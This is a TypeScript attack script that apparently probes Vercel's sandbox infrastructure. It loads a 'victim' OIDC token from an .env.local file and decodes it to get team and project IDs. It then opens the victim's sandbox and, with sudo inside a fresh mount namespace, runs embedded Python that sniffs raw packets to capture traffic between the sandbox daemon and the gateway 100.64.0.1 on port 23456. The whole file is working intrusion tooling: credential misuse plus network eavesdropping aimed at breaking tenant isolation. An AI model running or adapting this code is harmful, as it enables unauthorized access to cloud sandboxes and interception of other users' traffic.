import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== capture cell->gateway payload on 23456 (10s) ==="
timeout 12 python3 - <<'PYEOF'
import socket, struct, time, select, binascii
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind(("eth0",0))
out = __import__("subprocess").check_output(["ip","-4","addr","show","eth0"]).decode()
myip = ""
for line in out.splitlines():
    if "inet " in line:
        myip = line.strip().split()[1].split("/")[0]
end = time.time()+10
count = 0
while time.time() < end:
    r,_,_ = select.select([s],[],[],0.5)
    if not r: continue
    try: data = s.recv(65535)
    except Exception: continue
    if len(data) < 54: continue
    eth = data[:14]
    if eth[12:14] != b"\\x08\\x00": continue
    iph = data[14:34]
    srcip = socket.inet_ntoa(iph[12:16]); dstip = socket.inet_ntoa(iph[16:20])
    proto = iph[9]
    if proto != 6: continue
    ihl = (iph[0] & 0x0f) * 4
    tcph = data[14+ihl:14+ihl+20]
    sp, dp = struct.unpack("!HH", tcph[0:4])
    flags = tcph[13]
    payload = data[14+ihl+20:]
    # outbound to gateway on 23456 (cell daemon replying) OR gateway->cell on 23456
    if (dstip == "100.64.0.1" and sp == 23456) or (srcip == "100.64.0.1" and dp == 23456):
        if payload and len(payload) > 1:
            count += 1
            print("--- pkt %d %s:%d -> %s:%d flags=0x%02x payload %d bytes ---" % (count, srcip, sp, dstip, dp, flags, len(payload)))
            try:
                print(repr(payload[:400]))
            except Exception:
                print(binascii.hexlify(payload[:200]))
            if count >= 6: break
print("captured", count)
PYEOF
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore32.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore32.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
